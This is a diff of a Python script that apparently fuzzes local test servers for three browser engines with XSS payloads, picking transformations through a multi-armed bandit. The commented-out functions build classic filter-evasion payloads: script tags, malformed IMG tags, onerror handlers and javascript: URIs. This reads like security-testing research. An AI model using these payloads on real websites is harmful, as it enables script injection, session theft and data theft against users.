@@ -20,7 +20,7 @@ def XSS_bandit():
     return Bandit(arms)
     
 def send_and_get_result(payload_):
-    engine_to_ip_dict = {"chromium": "127.0.0.1:8000", "safari": "127.0.0.1:8001", "firefox": "127.0.0.1:8002"}
+    engine_to_ip_dict = {"chromium": "http://127.0.0.1:8000", "safari": "http://127.0.0.1:8001", "firefox": "http://127.0.0.1:8002"}
 
     # 1st choose which server to send it to (which browser engine)
     engines = ["chromium", "safari", "firefox"]
@@ -28,7 +28,7 @@ def send_and_get_result(payload_):
     ip = engine_to_ip_dict[engine]
 
     # 2nd send the payload to that server
-    full_ip = ip + "/search/?q=" + payload_
+    full_ip = ip + "/search/?q=" + str(payload_)
     r = requests.get(full_ip)
 
     # 3rd receive a HTTP response of that server (this will be either 200 (success) or 404 (fail))
@@ -37,7 +37,7 @@ def send_and_get_result(payload_):
     # 4th return this response
     if status == 200:
         return 1
-    else:
+    elif status == 404:
         return 0
 
 
@@ -127,37 +127,35 @@ def create_XSS_transformations(amount: int):
 #     return 20
 
 
-'''
-Properly implemented XSS payload transformations
 
-def script_tags(base_payload: str):
-    return "<script>" + base_payload + "</script>"
+# Properly implemented XSS payload transformations
 
-def non_alpha_non_digit(base_payload: str):
-    return "<script\XSS>" + base_payload + "</script>"
+# def script_tags(base_payload: str):
+#     return "<script>" + base_payload + "</script>"
 
-def malformed_IMG_tags(base_payload: str):
-    return "<IMG \"\"\"><script>" + base_payload + "</script>\"\\>"
+# def non_alpha_non_digit(base_payload: str):
+#     return "<script\XSS>" + base_payload + "</script>"
 
-def on_error_alert(base_payload: str):
-    return "<IMG SRC=/ onerror=\"" + base_payload + "\"></img>" # can also change the text inside the alert to String.fromCharCode(num, num, num) if you want to completely remove quotes from the payload
+# def malformed_IMG_tags(base_payload: str):
+#     return "<IMG \"\"\"><script>" + base_payload + "</script>\"\\>"
 
-def extraneous_open_brackets(base_payload: str):
-    return "<script>" + base_payload + ";//\<</script>"
+# def on_error_alert(base_payload: str):
+#     return "<IMG SRC=/ onerror=\"" + base_payload + "\"></img>" # can also change the text inside the alert to String.fromCharCode(num, num, num) if you want to completely remove quotes from the payload
 
-def end_title_tag(base_payload: str):
-    return "</TITLE><script>" + base_payload + ";</script>"
+# def extraneous_open_brackets(base_payload: str):
+#     return "<script>" + base_payload + ";//\<</script>"
 
-def input_image(base_payload: str):
-    return "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:" + base_payload + ";\">"
+# def end_title_tag(base_payload: str):
+#     return "</TITLE><script>" + base_payload + ";</script>"
 
-def body_image(base_payload: str):
-    return "<BODY BACKGROUND=\"javascript:" + base_payload + "\">"
+# def input_image(base_payload: str):
+#     return "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:" + base_payload + ";\">"
 
-def IMG_Dynsrc(base_payload: str):
-    return "<IMG DYNSRC=\"javascript:" + base_payload + "\">"
+# def body_image(base_payload: str):
+#     return "<BODY BACKGROUND=\"javascript:" + base_payload + "\">"
 
-def IMG_Lowsrc(base_payload: str):
-    return "<IMG LOWSRC=\"javascript:" + base_payload + "\">"
+# def IMG_Dynsrc(base_payload: str):
+#     return "<IMG DYNSRC=\"javascript:" + base_payload + "\">"
 
-'''
+# def IMG_Lowsrc(base_payload: str):
+#     return "<IMG LOWSRC=\"javascript:" + base_payload + "\">"
